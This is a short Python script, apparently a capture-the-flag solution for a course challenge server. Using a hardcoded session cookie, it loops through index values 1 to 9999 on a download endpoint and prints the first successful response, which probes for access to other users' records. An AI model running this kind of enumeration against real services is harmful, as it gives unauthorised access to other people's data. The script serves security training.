import requests
import json

# Request sends an HTTP request with custom request content
#遍历所有的用户，找到用户的uid

url = "http://course.hitctf.cn:28980/download?idx={idx}"
headers = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Cookie": "session=eyJ1aWQiOjYzMjR9.Znrl6A.5Y2n_FikLhSdcX8KQ1TjekVoqEE"
}
for i in range(1, 10000):
    print(i)
    response = requests.get(url.format(idx=i), headers=headers)
    print(response.status_code)
    if response.status_code == 200:
        print(response.text)
        break



